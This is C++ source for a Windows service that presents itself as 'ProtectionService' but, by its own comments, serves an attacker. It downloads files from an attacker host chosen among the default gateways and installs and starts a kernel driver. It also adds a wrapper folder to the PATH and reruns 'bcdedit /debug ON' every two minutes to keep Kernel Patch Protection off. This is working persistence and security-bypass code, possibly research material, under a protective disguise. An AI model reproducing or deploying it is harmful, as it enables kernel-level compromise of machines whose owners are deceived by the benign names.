#include <iostream>
#include <sys/types.h>
#include <sys/stat.h>
#include "utils.h"
#include "service.h"
#include <shlobj_core.h>
WCHAR* AppDataPath = NULL;
BOOL TerminateService = FALSE;


// Declerations for used functions:
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv);  // actual Main() of service, initiates service operations
VOID WINAPI ServiceControlHandler(DWORD);  // controls events, like IRP_MJ_DEVICE_CONTROL in KM
DWORD WINAPI ServiceMainThread(LPVOID lpParam);  // main thread, actually activates the medium service and maps the driver


DWORD WINAPI ServiceMainThread(LPVOID lpParam) {
    int LastError = 0;
    char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char FileHostIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char* FileHostAddresses = NULL;
    WCHAR DriverServiceCreateCommand[MAX_PATH] = { 0 };
    WCHAR EnvironmentVariablePath[MAX_PATH] = { 0 };


    // Get the possible IP addresses for the attacker (in this case - all default gateways):
    FileHostAddresses = GetGatewayList();
    if (FileHostAddresses == NULL) {
        return 1;
    }
    

    // Get IP addresses of target and attacker:
    if (!MatchIpAddresses(TargetIp, FileHostIp, FileHostAddresses)) {
        return 1;
    }


    while (!TerminateService) {
        RtlZeroMemory(DriverServiceCreateCommand, MAX_PATH * sizeof(WCHAR));
        RtlZeroMemory(EnvironmentVariablePath, MAX_PATH * sizeof(WCHAR));


        // Make sure that all depended-on files exist on target machine (folders + files):
        LastError = VerfifyDepDirs(AppDataPath);
        if (LastError != 0) {
            return LastError;
        }
        LastError = VerfifyDepFiles(FileHostIp, AppDataPath);
        if (LastError != 0) {
            return LastError;
        }


        // Create service (if did not exist already, if does sc create will fail):
        wcscat_s(DriverServiceCreateCommand, L"C:\\Windows\\System32\\sc.exe create ProtectionDriver type=kernel start=system binPath=\"");
        wcscat_s(DriverServiceCreateCommand, AppDataPath);
        wcscat_s(DriverServiceCreateCommand, L"\\ProtectionSolution\\KernelDriver\\ProtectionDriver.sys\"");
        _wsystem(DriverServiceCreateCommand);
        system("sc start ProtectionDriver");  // If already exists/running - will fail


        // Verify if shortcut to wrappers dont point to wrappers, if so - link again:
        wcscat_s(EnvironmentVariablePath, AppDataPath);
        wcscat_s(EnvironmentVariablePath, L"\\ProtectionSolution\\DriverChecker");
        LastError = AddPathToEnvVariable(EnvironmentVariablePath);
        if (LastError != 0) {
            return LastError;
        }
        

        // Turn on all of the important security features ():
        // TODO
        

        // Make sure that KPP is still turned off:
        system("bcdedit /debug ON");
        Sleep(120000);  // Sleep for 2 minutes
    }
    return 0;
}


VOID WINAPI ServiceControlHandler(DWORD CtrlCode)
{
    switch (CtrlCode)
    {
    case SERVICE_CONTROL_STOP:

        if (AutomaticService.ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            break;

        AutomaticService.ServiceStatus.dwControlsAccepted = 0;
        AutomaticService.ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        AutomaticService.ServiceStatus.dwWin32ExitCode = 0;
        AutomaticService.ServiceStatus.dwCheckPoint = 4;

        SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
        TerminateService = TRUE;
        SetEvent(AutomaticService.StopEvent);  // Initiate the stop event - main working thread will be notified to stop working
        break;

    default:
        break;  // No need to handle any other type of events
    }
}


VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv)
{
    DWORD Status = E_FAIL;

    // Register the service control handler with the SCM so its possible to control the service -
    AutomaticService.StatusHandle = RegisterServiceCtrlHandler(AutomaticService.ServiceName, ServiceControlHandler);
    if (AutomaticService.StatusHandle != NULL) {
        // Initialize service status with values to show service controller the service is starting -
        RtlZeroMemory(&AutomaticService.ServiceStatus, sizeof(AutomaticService.ServiceStatus));
        AutomaticService.ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
        AutomaticService.ServiceStatus.dwControlsAccepted = 0;  // For now, no interaction with the service is accepted
        AutomaticService.ServiceStatus.dwCurrentState = SERVICE_START_PENDING;  // Intending to eventually start
        AutomaticService.ServiceStatus.dwWin32ExitCode = 0;  // STATUS_SUCCESS
        AutomaticService.ServiceStatus.dwServiceSpecificExitCode = 0;
        AutomaticService.ServiceStatus.dwCheckPoint = 0;

        if (SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus)) {
            AutomaticService.StopEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
            if (AutomaticService.StopEvent == NULL) {
                // Error creating the event that occurs when stopping the service (need to stop service manually) -
                AutomaticService.ServiceStatus.dwControlsAccepted = 0;  // For now, no interaction with the service is accepted
                AutomaticService.ServiceStatus.dwCurrentState = SERVICE_STOPPED;  // Service has stopped
                AutomaticService.ServiceStatus.dwWin32ExitCode = GetLastError();
                AutomaticService.ServiceStatus.dwCheckPoint = 1;
                SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
            }
            else {
                // Created stopping event successfully, proceed to start the service -
                AutomaticService.ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;  // Only accepted interaction with service is stopping it
                AutomaticService.ServiceStatus.dwCurrentState = SERVICE_RUNNING;  // Service is currently running
                AutomaticService.ServiceStatus.dwWin32ExitCode = 0;  // STATUS_SUCCESSFUL
                AutomaticService.ServiceStatus.dwCheckPoint = 0;
                if (SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus)) {
                    AutomaticService.MainThread = CreateThread(NULL, 0, ServiceMainThread, NULL, 0, NULL);
                    if (AutomaticService.MainThread != NULL) {
                        WaitForSingleObject(AutomaticService.MainThread, INFINITE);  // Wait for main thread to stop operating
                    }
                    CloseHandle(AutomaticService.StopEvent);  // Stop event not needed anymore

                    // Update final status of service (stopping after main operation) -
                    AutomaticService.ServiceStatus.dwControlsAccepted = 0;  // No interaction with service should occur when stopping
                    AutomaticService.ServiceStatus.dwCurrentState = SERVICE_STOPPED;  // Service has stopped operating
                    AutomaticService.ServiceStatus.dwWin32ExitCode = 0;  // STATUS_SUCCESS
                    AutomaticService.ServiceStatus.dwCheckPoint = 3;
                    SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
                }
            }
        }
    }
    return;
}


int main(int argc, TCHAR* argv[]) {
    WCHAR WideAutoName[] = L"ProtectionService";
    char ServiceFilePath[MAX_PATH] = { 0 };
    char AnsiAppDataPath[MAX_PATH] = { 0 };
    HRESULT Res = S_OK;
    AutomaticService.InitiateService(WideAutoName);
    Res = SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &AppDataPath);
    if (AppDataPath == NULL || Res != S_OK) {
        return 0;
    }
    WcharpToCharp(AnsiAppDataPath, AppDataPath);
    strcat_s(ServiceFilePath, AnsiAppDataPath);
    strcat_s(ServiceFilePath, "\\ProtectionSolution\\Service\\ProtectionService.exe");
    RtlCopyMemory(AutomaticService.ServiceFile, ServiceFilePath, strlen(ServiceFilePath) + 1);


    // Define the service table entry of the auto service (name, entrypoint ..) -
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {AutomaticService.ServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };


    // Start the service control dispatcher (used by SCM to call the service) -
    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE) {
        return GetLastError();
    }
    return 0;
}